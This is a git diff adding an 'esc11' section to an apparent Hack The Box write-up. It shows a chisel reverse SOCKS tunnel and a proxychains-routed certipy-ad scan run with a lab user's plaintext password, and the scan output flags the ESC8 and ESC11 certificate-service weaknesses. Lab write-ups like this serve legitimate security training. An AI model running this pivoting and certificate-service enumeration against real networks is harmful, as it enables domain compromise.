@@ -1036,6 +1036,68 @@ git@gpz-op26-toolkits:/tmp$ ./chisel client -v 10.10.14.148:1234 R:socks
 
 ```
 
+esc11
+
+```
+ proxychains certipy-ad find -u nvirelli@ghostlink.htb -p u47YUclrDiwWxBheaSzI -dc-ip 10.129.191.32 -dc-host dc01.ghostlink.htb -vulnerable -stdout
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.191.32:636  ...  OK
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA' via RRP
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:445  ...  OK
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA'
+[*] Checking web enrollment for CA 'ghostlink-GPZ-OP26-SECURE-CA' @ 'gpz-op26-secure.ghostlink.htb'
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:80  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:443 <--socket error or timeout!
+[!] Error checking web enrollment: [Errno 111] Connection refused
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
+    DNS Name                            : gpz-op26-secure.ghostlink.htb
+    Certificate Subject                 : CN=ghostlink-GPZ-OP26-SECURE-CA, DC=ghostlink, DC=htb
+    Certificate Serial Number           : 3F4302F3D68A6AAE4B792DB93F31CCE5
+    Certificate Validity Start          : 2026-03-03 16:52:14+00:00
+    Certificate Validity End            : 2126-03-03 17:02:12+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : True
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Disabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : GHOSTLINK.HTB\Administrators
+      Access Rights
+        ManageCa                        : GHOSTLINK.HTB\Administrators
+                                          GHOSTLINK.HTB\Domain Admins
+                                          GHOSTLINK.HTB\Enterprise Admins
+        ManageCertificates              : GHOSTLINK.HTB\Administrators
+                                          GHOSTLINK.HTB\Domain Admins
+                                          GHOSTLINK.HTB\Enterprise Admins
+        Enroll                          : GHOSTLINK.HTB\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled over HTTP.
+      ESC11                             : Encryption is not enforced for ICPR (RPC) requests.
+Certificate Templates                   : [!] Could not find any certificate templates
+                                                                                            
+```
+
 ### Exploitation
 
 Step-by-step privilege escalation.
